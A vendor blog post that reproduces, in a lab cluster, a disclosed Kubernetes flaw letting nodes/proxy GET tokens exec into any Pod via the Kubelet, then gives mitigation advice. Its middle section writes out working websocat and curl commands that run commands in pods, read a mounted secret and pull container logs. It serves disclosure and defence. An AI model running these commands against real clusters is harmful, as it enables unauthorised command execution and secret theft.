---
title: "How should OpenFaaS users approach nodes/proxy RCE in Kubernetes?"
description: "We spin up a Kubernetes cluster in record time to reproduce and address a security vulnerability in Kubernetes for OpenFaaS users."
date: 2026-01-27
author_staff_member: alex
categories:
- security
- kubernetes
- rce
dark_background: true
image: "/images/2026-01-k8s-rce/background.png"
hide_header_image: true
---

We spin up a temporary Kubernetes cluster to explore and address a newly surfaced security vulnerability in Kubernetes.

Security researcher Graham Helton recently disclosed an interesting Kubernetes RBAC behavior: [nodes/proxy GET permissions allow command execution in any Pod](https://grahamhelton.com/blog/nodes-proxy-rce). The Kubernetes Security Team closed this as "working as intended," but it's worth understanding the implications.

OpenFaaS is a popular serverless platform for running functions on Kubernetes, and is used by individual product teams, and for multi-tenant environments.

As a preamble, we should say that this is not specific to OpenFaaS, but should be well understood by any operator configuring OpenFaaS for production use. 

In this post, we'll:  

1. Spin up a K3s cluster in a [SlicerVM](https://slicervm.com) microVM and Firecracker. You could also use a public cloud VM like AWS EC2.
2. Install OpenFaaS Pro with `clusterRole: true` (which grants `nodes/proxy GET`)
3. Use the service account's token to execute commands in any Pod by connecting directly to the Kubelet on port 10250.
4. Whilst unexpected, we'll discuss why this isn't the risk you might think it is.

## The vulnerability in brief

This capability only becomes meaningful if a specific internal Kubernetes service account's token becomes compromised and a user with sufficient privileges can reach the Kubelet API - conditions that should not exist in a well-run production cluster.

Briefly speaking, this vulnerability requires:

* Possession of a Kubernetes service account token with nodes/proxy (GET) access
* Network reachability to a node's Kubelet server on port 10250

This is not a remote unauthenticated exploit, and it is not reachable via the OpenFaaS API. It requires an already-compromised Kubernetes service account token and network path to the Kubelet.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         The Attack Flow                                 │
└─────────────────────────────────────────────────────────────────────────┘

  ┌───────────────┐         ┌──────────────────┐         ┌──────────────┐
  │   Attacker    │         │   K8s API Server │         │    Kubelet   │
  │ (with token)  │         │                  │         │  (port 10250)│
  └───────┬───────┘         └────────┬─────────┘         └──────┬───────┘
          │                          │                          │
          │  1. GET nodes/proxy      │                          │
          │  ────────────────────►   │                          │
          │                          │                          │
          │  ✓ Authorized (GET)      │                          │
          │  ◄────────────────────   │                          │
          │                          │                          │
          │  2. WebSocket upgrade to Kubelet ──────────────────►│
          │     (still a GET!)                                  │
          │                          │                          │
          │  3. /exec/namespace/pod?command=id ────────────────►│
          │     (exec via WebSocket)                            │
          │                          │                          │
          │  ✓ Kubelet allows it     │                          │
          │  ◄──────────────────────────────────────────────────│
          │     (sees GET, not exec)                            │
          │                          │                          │
          ▼                          ▼                          ▼

  The Kubelet checks the HTTP method (GET) not the action (exec)
  ═══════════════════════════════════════════════════════════════
```

The Kubelet makes authorization decisions based on the HTTP method of the initial WebSocket handshake (`GET`), not the operation being performed (`exec`). Since WebSockets require an HTTP GET to establish the connection, a service account with only `nodes/proxy GET` can execute commands in any Pod by connecting directly to the Kubelet on port 10250.

According to Helton, his search found 69 affected publicly listed Helm charts including: Prometheus, Datadog, Grafana, and OpenFaaS when deployed with `clusterRole: true`. The common theme with each of these, is that they gather key metrics and log data from individual nodes in order to provide value to the end user - monitoring, or in the case of OpenFaaS, both monitoring and autoscaling.

### A note on alerts from CVE scanners in general

We often get emails to our support inbox from customers who are concerned about automated vulnerability reports where a CVE is found in a base image or the Go runtime. That's normal, and having a defined process for fixes and turn-around is important for any vendor that deals with risk-sensitive enterprise customers. Typically, the CVE in question will be a false positive - yes it is present, however it is not exercised in any way in the codebase. We'll sometimes nudge customers to run `govulncheck` against the binary to see that for themselves.

That doesn't mean we ignore CVEs that concern customers, we're very responsive, however, we also don't want them to be distracted about false positives.

# Tutorial

### Our lab setup

We'll use [SlicerVM](https://slicervm.com) to spin up a temporary Kubernetes cluster in a Firecracker microVM. You could also use a public Kubernetes service or your VM provider of choice.

This is what it'll look like, pretty much everything is fully installed and setup, including the login step for `faas-cli` and configuring `kubectl`.

```
 Host                        Firecracker microVM
  │                                  │
  │  slicer up k3s-rce.yaml          │
  │─────────────────────────────────►│
  │                                  │
  │  .secrets/LICENSE ──(VSOCK)─────►│ /run/slicer/secrets/
  │                                  │
  │                                  │  userdata.sh starts
  │                                  │        │
  │                                  │        ▼
  │                                  │  ┌──────────┐
  │                                  │  │  arkade  │ get kubectl, helm,
  │                                  │  └────┬─────┘ faas-cli, k3sup...
  │                                  │       │
  │                                  │       ▼
  │                                  │  ┌──────────┐
  │                                  │  │  k3sup   │ install K3s
  │                                  │  └────┬─────┘
  │                                  │       │
  │                                  │       ▼
  │                                  │  ┌──────────┐
  │                                  │  │   helm   │ install OpenFaaS Pro
  │                                  │  └────┬─────┘ (clusterRole=true)
  │                                  │       │
  │                                  │       ▼
  │                                  │  Ready! K3s + OpenFaaS
  │                                  │
  │  slicer vm shell ───────────────►│  ubuntu@k3s-rce-1:~$
  │                                  │
```

[SlicerVM](https://slicervm.com) is a tool we've used internally since around 2022 for building out Kubernetes clusters on bare-metal, on our own hardware. Sometimes, that's a mini PC in the office, and at other times, it's a larger, public-facing bare-metal server from a vendor like Hetzner. It gets around a few prickly issues with cloud-based K8s like: excessive cost, slow setup, and a very limited number of Pods per machine. 

In late 2025, [we released it for general consumption](https://blog.alexellis.io/slicer-bare-metal-preview/), with an additional mode to launch disposable VMs for automation and coding agents and have been building up an engaged community of users on our Discord server.

The point is: from the moment a customer support request comes in, we can have a full installation of OpenFaaS and K3s within less than a minute. This is a key part of our customer support process - rapid responses, fast iterating on new features, with higher performance for lower cost than public cloud.

Leave 1-2 clusters running on AWS EKS for some research? You may find your manager breathing down your neck about a mysterious 2000 USD AWS bill.

We don't have that problem. We'll show you a quick way to spin up OpenFaaS with K3s in a microVM, like we'd do for a customer support request.

SlicerVM can also run autoscaling Kubernetes nodes, and can run HA across a number of VMs or physical hosts. You can find out more in the [Kubernetes section of the docs](https://docs.slicervm.com/).

### Step 1: Set up the secrets

On a machine with Linux installed, and KVM available (bare-metal or nested virtualization), [install Slicer](https://docs.slicervm.com/getting-started/install/).

You can use a [commercial seat, or your Home Edition license](https://slicervm.com/pricing).

Create a working directory for the lab.

```bash
mkdir -p k3s-rce
cd k3s-rce
```

Create a `.secrets/` folder with your OpenFaaS license. Slicer's secret store syncs files securely into the VM via its guest agent over VSOCK—no need to expose secrets in userdata.

```bash
sudo mkdir -p .secrets
sudo chmod 700 .secrets

# Copy from your existing license location
sudo cp ~/.openfaas/LICENSE .secrets/LICENSE
```

### Step 2: Create the userdata script

Create `userdata.sh` to bootstrap K3s and OpenFaaS Pro:

```bash
#!/bin/bash
set -ex

export HOME=/home/ubuntu
export USER=ubuntu
cd /home/ubuntu/

(
arkade update
arkade get kubectl helm faas-cli k3sup stern jq websocat --path /usr/local/bin
chown $USER /usr/local/bin/*
mkdir -p .kube
)

(
k3sup install --local --k3s-extra-args '--disable traefik'
mv ./kubeconfig ./.kube/config
chown $USER .kube/config
)

export KUBECONFIG=/home/ubuntu/.kube/config

# Block until ready
k3sup ready --kubeconfig $KUBECONFIG

(
kubectl apply -f https://raw.githubusercontent.com/openfaas/faas-netes/master/namespaces.yml

kubectl create secret generic \
  -n openfaas \
  openfaas-license \
  --from-file=license=/run/slicer/secrets/LICENSE

helm repo add openfaas https://openfaas.github.io/faas-netes/
helm repo update

helm upgrade --install openfaas openfaas/openfaas \
  --namespace openfaas \
  -f https://raw.githubusercontent.com/openfaas/faas-netes/refs/heads/master/chart/openfaas/values-pro.yaml \
  --set clusterRole=true

PASSWORD=$(kubectl get secret -n openfaas basic-auth -o jsonpath="{.data.basic-auth-password}" | base64 --decode)
echo "$PASSWORD" > /home/ubuntu/.openfaas-password

chown -R $USER $HOME
echo "export OPENFAAS_URL=http://127.0.0.1:31112" >> $HOME/.bashrc
echo "export KUBECONFIG=/home/ubuntu/.kube/config" >> $HOME/.bashrc
echo "cat /home/ubuntu/.openfaas-password | faas-cli login --password-stdin" >> $HOME/.bashrc
)
```

### Step 3: Generate the VM config

```bash
slicer new k3s-rce \
  --net=isolated \
  --allow=0.0.0.0/0 \
  --cpu=2 \
  --ram=4 \
  --userdata-file ./userdata.sh \
  > k3s-rce.yaml
```

Feel free to explore the YAML file to see what's going on, you can edit it, or add additional settings via `slicer new --help`.

### Step 4: Start the VM

We tend to run Slicer in a tmux window, so we can detach and reconnect later.

```bash
tmux new -s slicer
```

```bash
sudo -E slicer up ./k3s-rce.yaml
```

On the first run, the base VM image will be downloaded and unpacked. It can take a few seconds to a minute or so, then new VM launches will be almost instant.

Then once booted, the userdata to set up K3s and wait for its readiness could also take a minute or two.

Wait until userdata has fully completed, you can also run this via `watch`:

```bash
sudo -E ./slicer vm health
HOSTNAME                  AGENT UPTIME         SYSTEM UPTIME        AGENT VERSION   USERDATA RAN
--------                  ------------         -------------        -------------   ------------
k3s-rce-1                 22s                  22s                  0.1.57          1         
```

### Step 5: Shell into the VM

```bash
sudo -E slicer vm shell --uid 1000

# Or give the VM name explicitly
sudo -E slicer vm shell --uid 1000 k3s-rce-1
```

Once inside, verify OpenFaaS is running:

```bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.10.240 x86_64)
ubuntu@k3s-rce-1:~$

kubectl get pods -n openfaas
```

### Step 6: Extract the prometheus service account token

The OpenFaaS prometheus deployment uses a service account with `nodes/proxy GET` for scraping metrics:

```bash
TOKEN=$(kubectl create token openfaas-prometheus -n openfaas --duration=1h)
echo $TOKEN
```

You'll be presented with a JWT, you can copy and paste this into [https://jwt.io](https://jwt.io) to look into the claims if you wish. It's a standard JWT, so you can use any JWT decoder to view the claims.

```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local",
    "k3s"
  ],
  "exp": 1769517043,
  "iat": 1769513443,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "6f6c4370-ecda-4661-8ed0-803b6dc4ea64",
  "kubernetes.io": {
    "namespace": "openfaas",
    "serviceaccount": {
      "name": "openfaas-prometheus",
      "uid": "593cba9a-8dd7-488b-96c0-d44bd5a6d703"
    }
  },
  "nbf": 1769513443,
  "sub": "system:serviceaccount:openfaas:openfaas-prometheus"
}
```

Verify the permissions:

```bash
kubectl auth can-i --list --as=system:serviceaccount:openfaas:openfaas-prometheus | grep nodes

Resources      Non-Resource URLs     Resource Names   Verbs
nodes/proxy    []                    []               [get list watch]
nodes          []                    []               [get list watch]
```

The key permission here is `nodes/proxy GET`.

### Step 7: Discover the node IP and pods

```bash
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo "Node IP: $NODE_IP"

echo "Pods:"
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://$NODE_IP:10250/pods" | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"' | head -10

```

Example output:

```
Node IP: 172.16.0.2

Pods:
kube-system/metrics-server-7b9c9c4b9c-79tn9
openfaas/autoscaler-5c9677bb4d-pxklm
openfaas/queue-worker-586c6c964b-fzvj9
openfaas/queue-worker-586c6c964b-lq6tf
openfaas/gateway-5596cbd757-f9kws
openfaas/prometheus-d9665fc79-vczwd
kube-system/coredns-7f496c8d7d-j6dsn
kube-system/local-path-provisioner-578895bd58-zhl9q
openfaas/nats-5cfd5b5bc8-mphfb
openfaas/queue-worker-586c6c964b-mvl9f
```

### Step 8: Execute commands via WebSocket

Here's the exploit. Despite only having `nodes/proxy GET`, we can exec into any pod.

Find a gateway pod, and then use the token to exec into it:

```bash
POD=$(kubectl get pods -n openfaas -l app=gateway -o jsonpath='{.items[0].metadata.name}')

websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://$NODE_IP:10250/exec/openfaas/$POD/operator?output=1&error=1&command=id"
```

Output:

```
uid=100(app) gid=65533(nogroup) groups=65533(nogroup)
{"metadata":{},"status":"Success"}
```

Now let's create a secret for a function, deploy the function, then use the exec approach to obtain the contents of the secret.

This is a toy function that simply echos its hostname, it doesn't consume the secret, but it is mounted into the function.

```bash
faas-cli secret create api-key --from-literal=secret-key

faas-cli deploy --name fn1 \
  --image ghcr.io/openfaas/alpine:latest \
  --secret api-key \
  --env fprocess="cat /etc/hostname"

# Try out the function

faas-cli invoke fn1 <<< ""
fn1-dff95b7d8-zdncl
```

Now, get the Pod name for the function as before:

```bash
POD=$(kubectl get pods -n openfaas-fn -l faas_function=fn1 -o jsonpath='{.items[0].metadata.name}')
echo "Function Pod: $POD"
```

Next, use `websocat` to exec into the function pod, and list, then obtain secrets at the standard mount path: `/var/openfaas/secrets`:

The example given by Helton only runs a single command without arguments, we need to extend it to specify a target file or directory by repeating `&command=` for each additional argument.


```bash 
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://$NODE_IP:10250/exec/openfaas-fn/$POD/fn1?output=1&error=1&command=ls&command=/var/openfaas/secrets"
```

Output:

```
total 8
-rw-r--r-- 1 root root 4096 Jan 27 12:00 api-key
{"metadata":{},"status":"Success"}
```

Now, obtain the secret contents:

```bash
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://$NODE_IP:10250/exec/openfaas-fn/$POD/fn1?output=1&error=1&command=cat&command=/var/openfaas/secrets/api-key"
```

The output shows the contents of the secret:

```
secret-key
{"metadata":{},"status":"Success"}
```

So, we've successfully executed commands in a Pod, and obtained the contents of a secret.


What might not be as obvious, is that the same node/proxy GET permission can be used to fetch container logs. In an ideal world, functions should not be logging sensitive data to stdout/stderr, however some teams may even consider the name of a function to be confidential information.

```bash
ubuntu@k3s-rce-1:~$ curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  "https://$NODE_IP:10250/containerLogs/openfaas-fn/$POD/fn1?tailLines=100&timestamps=true"

2026-01-27T11:42:58.759721814Z 2026/01/27 11:42:58 Version: 0.3.3	SHA: bf545828573185cd03ebc60254ba3d01d6bbcc5b
2026-01-27T11:42:58.760982598Z 2026/01/27 11:42:58 Timeouts: read: 30s write: 30s hard: 0s health: 30s.
2026-01-27T11:42:58.760992609Z 2026/01/27 11:42:58 Listening on port: 8080
2026-01-27T11:42:58.760995637Z 2026/01/27 11:42:58 Writing lock-file to: /tmp/.lock
2026-01-27T11:42:58.760997950Z 2026/01/27 11:42:58 Metrics listening on port: 8081
2026-01-27T11:43:01.643064545Z 2026/01/27 11:43:01 Forking fprocess.
2026-01-27T11:43:01.643729053Z 2026/01/27 11:43:01 Wrote 20 Bytes - Duration: 0.000705s
2026-01-27T12:48:13.897806818Z 2026/01/27 12:48:13 Forking fprocess.
2026-01-27T12:48:13.898409344Z 2026/01/27 12:48:13 Wrote 20 Bytes - Duration: 0.000573s
2026-01-27T12:48:15.076840450Z 2026/01/27 12:48:15 Forking fprocess.
2026-01-27T12:48:15.077518996Z 2026/01/27 12:48:15 Wrote 20 Bytes - Duration: 0.000736s
```

## What we've learned from this exercise

### This isn't as scary as it sounds

The dramatic headline of the disclosure makes this look catastrophic. In practice, a properly configured OpenFaaS deployment, and best practices for kubectl access neutralise the risk.

*1. OpenFaaS for Enterprises has its own IAM system*

No OpenFaaS IAM role grants access to Kubernetes service account tokens. Users interact via the OpenFaaS API/CLI, not via `kubectl`. The Prometheus service account is internal infrastructure, and is not accessible to users.

If you're running OpenFaaS Standard, the same holds, however instead of using fine-grained IAM and user accounts, you're likely using a single user account for administration. But that account is within OpenFaaS, not within Kubernetes.

We believe that end-users, who write, deploy and support functions can perform their duties without the need for `kubectl` access. The `faas-cli`, OpenFaaS Dashboard, and CLI/REST API provide all functionality required for users to manage their functions, and monitor their usage. Enterprise users can also [enable auditing for the API](https://docs.openfaas.com/openfaas-pro/iam/auditing/).

Ideally, only trusted staff within the DevOps or infrastructure teams should have `kubectl` access, aligned with best practices of least privilege and short-lived credentials.

*2. Users should never have kubectl access in production*

The ideal deployment pattern:

| Environment                        | Access Model                                                                         |
|------------------------------------|--------------------------------------------------------------------------------------|
| Local dev on your own machine      | Direct `kubectl` access to your own machine is fine, use non-production credentials |
| Staging/shared clusters            | Grant only limited `kubectl` access, do not grant access to the `openfaas` namespace |
| Production                         | **Time-limited `kubectl` access to SRE/DevOps team only** |

Typically, companies that are SOC2 or ISO 27001 compliant implement two roles. Development and deployment/operations. Development teams should not generally have access to the production cluster, but deploy via decoupled CI/CD pipelines or GitOps tools.

*3. The service account requires network access to the Kubelet*

You need to reach port 10250 on a node. In most production setups, this is firewalled or only accessible from within the cluster.

*4. Metrics require this permission*

The `nodes/proxy GET` permission exists because Prometheus (and similar tools) need to scrape `/metrics` and `/stats` endpoints from Kubelets. It's required for the value proposition of monitoring. 67+ other cloud-native projects have the same requirement. OpenFaaS uses this data for monitoring, and for autoscaling on RAM/CPU usage.

### What you should do

1. *Don't grant users kubectl access in production* - deployments should happen solely through GitOps tools or a CI/CD pipeline. Users should only have read-only "openfaas" IAM-based access via the OpenFaaS Dashboard, and no kubectl access of any form
2. *Network-segment the Kubelet API* - ensure port 10250 isn't reachable from user workloads
3. *Use OpenFaaS IAM* - it provides function-level RBAC without exposing Kubernetes primitives
4. *Monitor for direct Kubelet access* - depending on your audit policy, you may see associated authorization checks (e.g. SubjectAccessReview events), even if the exec stream isn’t logged.

### Wrapping up

This is a real quirk in Kubernetes RBAC—the fact that `GET` vs `CREATE` authorization depends on the transport protocol is surprising. Calling it "RCE" overstates the practical risk for well-architected deployments of OpenFaaS:

- The affected service account is internal infrastructure
- Properly configured OpenFaaS users _should_ never be able to interact with it directly
- Production is where real secrets are defined, and should use GitOps/CI deployments, not manual `kubectl` access

We realise that you may have much more than OpenFaaS installed in your cluster, so now is the time to carefully review your security policies, and user access. 

If you have any questions or concerns, get in touch with us directly via our support inbox.

See also:

- [Graham Helton's full disclosure](https://grahamhelton.com/blog/nodes-proxy-rce)
- [Interactive lab on iximiuz](https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9)
- [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
- [SlicerVM homepage](https://slicervm.com)
